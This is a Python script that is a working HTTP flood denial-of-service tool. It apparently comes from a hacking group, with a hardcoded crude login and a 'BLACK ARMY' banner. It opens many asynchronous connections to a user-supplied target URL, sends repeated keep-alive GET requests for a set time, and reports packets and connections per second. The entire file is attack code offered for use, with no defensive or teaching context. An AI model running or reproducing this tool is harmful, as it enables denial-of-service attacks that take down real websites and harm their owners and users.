#!usr/bin/python
# _*_ coding: utf-8 _*_
import os
import sys
import time
import fade
from asyncio import open_connection, create_task, Event, sleep, run
from yarl import URL
from sys import argv as args
from contextlib import suppress

def clear():
    os.system("cls" if os.name == "nt" else "clear")

# Color
class bcolors:
    NBlack = "\033[38;5;0m  \033[0m"
    NRed = "\033[38;5;1m  \033[0m"
    NGreen = "\033[38;5;2m  \033[0m"
    NYellow = "\033[38;5;3m  \033[0m"
    NBlue = "\033[38;5;4m  \033[0m"
    NMagenta = "\033[38;5;5m  \033[0m"
    NCyan = "\033[38;5;6m  \033[0m"
    NWhite =  "\033[38;5;7m  \033[0m"
    BrightBlack = "\033[48;5;0m  \033[0m"
    BrightRed =  "\033[48;5;1m  \033[0m"
    BrightGreen = "\033[48;5;2m  \033[0m"
    BrightYellow = "\033[48;5;3m  \033[0m"
    BrightBlue = "\033[48;5;4m  \033[0m"
    BrightMagenta = "\033[48;5;5m  \033[0m"
    BrightCyan = "\033[48;5;6m  \033[0m"
    BrightWhite = "\033[48;5;7m  \033[0m"

    
    
attemps = 0
os.system('clear')
logo = """
 ╭╮╭─────╮╭─────╮
 │││╭───╮││╭───╮│
 ││││   ╰╯││   ││ 
 ││││     ││   ││
 ││││   ╭╮││   ││
 │││╰───╯││╰───╯│
 ╰╰─────╯╰─────╯
"""
faded_text = fade.fire(logo)
print(faded_text)
while attemps < 100:
    username = input("\033[32m┏> Enter your username:\033[30m")
    password = input("\033[32m┗> Enter your password:\033[30m")

    if username == 'fucking' and password == 'love':
        print("\033[48;5;3m•••⟩⟩ BLACK ARMY COMUNNITY ...!!\033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

pps, cps = 0, 0

async def flooder(target: URL, payload: bytes, event: Event, rpc: int = 100):
    global pps, cps
    await event.wait()

    while event.is_set():
        with suppress(Exception):
            r, w = await open_connection(target.host, target.port or 80, ssl=target.scheme == "https")
            cps += 1
            for _ in range(rpc):
                w.write(payload)
                await w.drain()
                pps += 1

async def main():
    global pps, cps

    try:

        assert len(args) == 5, "python3 %s <target> <workers> <rpc> <timer>" % args[0]
        assert URL(args[1]) or None, "Invalid url"
        assert args[2].isdigit(), "Invalid workers integer"
        assert args[3].isdigit(), "Invalid connection pre seconds"
        assert args[4].isdigit(), "Invalid timer"
        
        target = URL(args[1])
        workers = int(args[2])
        rpc = int(args[3])
        timer = int(args[4])
        event = Event()

        payload = (
            f"GET {target.raw_path_qs} HTTP/1.1\r\n"
            f"Host: {target.raw_authority}\r\n"
            "Connection: keep-alive\r\n"
            "\r\n").encode()

        event.clear()
        
        for _ in range(workers):
            create_task(flooder(target, payload, event, rpc))
            await sleep(.0)
            
        event.set()
        
        print("Attack started to %s" % target.human_repr())

        while timer:
            pps, cps = 0, 0
            await sleep(1)
            timer -= 1
            print(f"\033[48;5;4m\033[30m PPS: {pps:,} | CPS: {cps:,} \033[0m\033[38;5;3m|Time Remaining:{timer:,}s")
            await sleep(1)
            timer -= 1
            print(f"\033[32m--Info target \033[38;5;6m" +str(target)+ "\033[0m")
        event.clear()
    except AssertionError as e:
        print(str(e) or repr(e))
        
run(main())

              
